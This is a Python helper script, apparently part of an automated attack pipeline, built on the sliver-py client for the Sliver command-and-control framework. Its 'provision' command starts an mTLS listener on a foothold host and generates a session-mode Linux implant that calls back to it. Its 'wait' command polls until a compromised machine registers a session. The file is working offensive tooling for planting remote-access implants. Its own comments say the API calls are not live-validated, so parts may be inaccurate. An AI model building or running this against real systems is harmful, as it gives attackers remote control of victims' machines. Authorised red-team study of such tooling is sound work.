"""sliver-py operator-client helper — the ONLY place that imports sliver-py. Runs under the dedicated
sliver venv (cfg.get_sliver_python()), invoked by sliver_c2.py (which lives in the manager venv and
cannot import sliver-py). Two subcommands:

  provision --cfg <op.cfg> --listener-host H --listener-port P --out <path>
      connect, start an mTLS listener on the foothold, generate a session-mode implant, save it to <path>.
  wait --cfg <op.cfg> --timeout T
      connect, poll sessions() until at least one is registered (exit 0) or timeout (exit 1).

NOT LIVE-VALIDATED. The sliver-py API below is written from its documented shape; the exact method
signatures are version-specific and the implant-generation config (an ImplantConfig protobuf) is the
single part most likely to need rework against an installed Sliver. Every such point is marked VALIDATE.
"""
from __future__ import annotations

import argparse
import asyncio
import sys
import time


async def _connect(cfg_path: str):
    # VALIDATE: import path + config parsing across sliver-py versions.
    from sliver import SliverClient, SliverClientConfig
    config = SliverClientConfig.parse_config_file(cfg_path)
    client = SliverClient(config)
    await client.connect()
    return client


async def _provision(args) -> int:
    client = await _connect(args.cfg)
    # 1. Start the mTLS C2 listener on the foothold. VALIDATE: start_mtls_listener signature (host/port
    #    kwargs vs positional; whether it blocks or returns a job).
    await client.start_mtls_listener(host=args.listener_host, port=args.listener_port)

    # 2. Generate a SESSION-mode Linux implant pointed at that listener, saved to --out.
    #    VALIDATE (MOST LIKELY TO NEED REWORK): building the ImplantConfig protobuf. sliver-py exposes
    #    the generated client stubs under sliver.pb.*; the exact field names (OS/Arch/Format/IsBeacon,
    #    the C2 list with mtls://host:port) and the generate_implant() return (a protobuf carrying the
    #    binary bytes under .File.Data) are version-specific. Shape:
    from sliver.pb.clientpb import client_pb2  # VALIDATE import path
    config = client_pb2.ImplantConfig(
        GOOS="linux", GOARCH="amd64",
        IsBeacon=False,                      # session mode
        Format=client_pb2.OutputFormat.EXECUTABLE,
        C2=[client_pb2.ImplantC2(URL=f"mtls://{args.listener_host}:{args.listener_port}")],
    )
    generated = await client.generate_implant(config)   # VALIDATE return shape
    data = generated.File.Data                            # VALIDATE attribute path
    with open(args.out, "wb") as f:
        f.write(data)
    print(f"provisioned: listener mtls://{args.listener_host}:{args.listener_port}, implant -> {args.out}")
    return 0


async def _wait(args) -> int:
    client = await _connect(args.cfg)
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        sessions = await client.sessions()   # VALIDATE: list of Session protobufs
        if sessions:
            print(f"session registered: {len(sessions)} (first={getattr(sessions[0], 'ID', '?')})")
            return 0
        await asyncio.sleep(3)
    print("no session registered before timeout", file=sys.stderr)
    return 1


def main() -> int:
    p = argparse.ArgumentParser()
    sub = p.add_subparsers(dest="cmd", required=True)
    pr = sub.add_parser("provision")
    pr.add_argument("--cfg", required=True)
    pr.add_argument("--listener-host", required=True)
    pr.add_argument("--listener-port", type=int, required=True)
    pr.add_argument("--out", required=True)
    w = sub.add_parser("wait")
    w.add_argument("--cfg", required=True)
    w.add_argument("--timeout", type=int, default=180)
    args = p.parse_args()
    fn = {"provision": _provision, "wait": _wait}[args.cmd]
    try:
        return asyncio.run(fn(args))
    except Exception as e:  # noqa: BLE001 — surface the error to sliver_c2's rc check
        print(f"sliver_ops {args.cmd} failed: {type(e).__name__}: {e}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
